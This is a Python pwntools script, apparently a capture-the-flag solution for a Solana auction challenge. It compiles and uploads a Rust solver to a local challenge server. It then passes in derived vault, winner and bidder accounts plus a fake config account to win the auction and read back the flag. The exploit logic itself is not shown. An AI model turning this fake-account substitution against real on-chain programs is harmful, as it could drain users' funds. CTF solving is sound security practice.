from pwn import *
from solders.pubkey import Pubkey as PublicKey
from solders.keypair import Keypair
from solders.system_program import ID as SYSTEM_PROGRAM_ID
import base58
import os

# --- Biên dịch chương trình solve ---
info("Compiling solve.so...")
os.system('cd solve && cargo build-sbf && cd ..')
info("Compilation complete.")

r = remote('localhost', 1337) # Thay 'localhost' bằng địa chỉ server nếu cần

# --- Gửi chương trình solve lên server ---
solve_so = open('solve/target/deploy/solve.so', 'rb').read()

r.recvuntil(b'program len: ')
r.sendline(str(len(solve_so)).encode())
r.send(solve_so)

# --- Nhận các thông tin từ server ---
r.recvuntil(b'solve pubkey: ')
solve_program_id = PublicKey(base58.b58decode(r.recvline().strip()))
r.recvuntil(b'program: ')
auction_program_id = PublicKey(base58.b58decode(r.recvline().strip()))
r.recvuntil(b'user: ')
user_id = PublicKey(base58.b58decode(r.recvline().strip()))
r.recvuntil(b'noobmaster: ')
noobmaster_id = PublicKey(base58.b58decode(r.recvline().strip()))

info(f"Solve Program ID: {solve_program_id}")
info(f"Auction Program ID: {auction_program_id}")
info(f"User ID: {user_id}")
info(f"Noobmaster ID: {noobmaster_id}")

# --- Chuẩn bị các tài khoản cho instruction ---
(user_config_pda, _) = PublicKey.find_program_address(
    [bytes(user_id), b"BIDDER"],
    auction_program_id
)

(noobmaster_config_pda, _) = PublicKey.find_program_address(
    [bytes(noobmaster_id), b"BIDDER"],
    auction_program_id
)

fake_config_account = Keypair()

(real_config_pda, _) = PublicKey.find_program_address(
    [b"INITIAL"],
    auction_program_id
)

(vault_pda, _) = PublicKey.find_program_address(
    [b"VAULT"],
    auction_program_id
)

(winner_pda, _) = PublicKey.find_program_address(
    [b"WINNER"],
    auction_program_id
)

# --- Gửi instruction khai thác ---
info("Sending exploit transaction...")

# Gửi số lượng tài khoản
num_accounts = 10
r.sendline(str(num_accounts).encode())

# Gửi các tài khoản theo đúng thứ tự mà solve.rs yêu cầu
r.sendline(b'ws ' + str(user_id).encode())
r.sendline(b'w ' + str(user_config_pda).encode())
r.sendline(b' ' + str(noobmaster_id).encode())
r.sendline(b'w ' + str(noobmaster_config_pda).encode())
r.sendline(b'ws ' + str(fake_config_account.pubkey()).encode())
r.sendline(b' ' + str(auction_program_id).encode())
r.sendline(b' ' + str(real_config_pda).encode())
r.sendline(b'w ' + str(vault_pda).encode())
r.sendline(b'w ' + str(winner_pda).encode())
r.sendline(b' ' + str(SYSTEM_PROGRAM_ID).encode())

# Gửi payload (instruction data) - không cần data vì chúng ta đã hardcode trong solve.rs
r.sendline(b'0') # Độ dài data = 0
r.send(b'')      # Data rỗng

# Nhận flag
info("Waiting for the flag...")
r.readuntil(b'1337 h4x0r: ')
flag = r.readline().strip().decode()
success(f"Flag: {flag}")